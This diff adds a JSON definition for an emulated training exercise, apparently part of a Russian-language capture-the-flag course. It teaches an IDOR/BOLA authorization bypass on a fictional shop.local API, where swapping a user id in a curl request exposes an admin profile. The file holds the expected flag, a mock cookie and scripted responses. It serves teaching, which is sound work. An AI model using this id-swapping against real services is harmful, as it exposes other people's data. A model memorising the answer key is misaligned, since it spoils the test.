@@ -1,0 +1,41 @@
+{
+  "id": "web-auth-core",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{1d0r_b0l4_br34ks_th3_b0und4ry}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: IDOR/BOLA (горизонтальный доступ)\n\nТы вошёл как `alice` (id=42) на `shop.local`. API отдаёт профиль по id,\nпроверяя только факт логина. Смени идентификатор на чужой.\n\n1. Свой профиль:\n   curl -s -b cookies.txt https://shop.local/api/v1/users/42\n2. Чужой id (администратор):\n   curl -s -b cookies.txt https://shop.local/api/v1/users/1\n3. В профиле админа — флаг.\n4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/cookies.txt",
+      "text": "# Netscape HTTP Cookie File\nshop.local\tFALSE\t/\tFALSE\t0\tsession\teyJ1aWQiOjQyfQ\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local/api/v1/users)",
+      "cases": [
+        {
+          "match": "users/1\\b",
+          "example": "-s -b cookies.txt https://shop.local/api/v1/users/1",
+          "output": "{\"id\":1,\"email\":\"admin@shop.local\",\"role\":\"admin\",\"balance\":99999,\"api_key\":\"nto{1d0r_b0l4_br34ks_th3_b0und4ry}\"}\n"
+        },
+        {
+          "match": "users/42",
+          "example": "-s -b cookies.txt https://shop.local/api/v1/users/42",
+          "output": "{\"id\":42,\"email\":\"alice@shop.local\",\"role\":\"user\",\"balance\":150}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://shop.local/api/v1/users/<id>.\n"
+    }
+  }
+}
